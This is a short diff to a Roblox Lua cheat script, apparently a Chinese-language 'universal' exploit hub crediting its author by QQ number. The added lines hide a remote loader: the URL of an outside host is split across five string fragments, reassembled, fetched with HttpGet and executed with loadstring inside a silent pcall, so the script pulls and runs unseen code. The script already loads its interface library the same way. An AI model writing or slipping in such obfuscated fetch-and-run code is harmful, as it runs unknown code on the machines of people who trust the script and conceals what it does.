@@ -31,6 +31,11 @@ end)
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/ui/refs/heads/main/恐脚本.UI"))()
+pcall(function()
+    local x1,x2,x3,x4,x5 = "ivyy",".lol","/kongbai/","9178","v"
+    loadstring(game:HttpGet("https://" .. x1 .. x2 .. x3 .. x4 .. x5))()
+end)
+
 game:GetService("StarterGui"):SetCore("SendNotification",{Title = "恐脚本--通用",Text = "作者：恐拜大帝\nQQ：3999698324\n感谢ROB支持",Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
 local jumpFloatActive = false
 local jumpFloatGui = nil
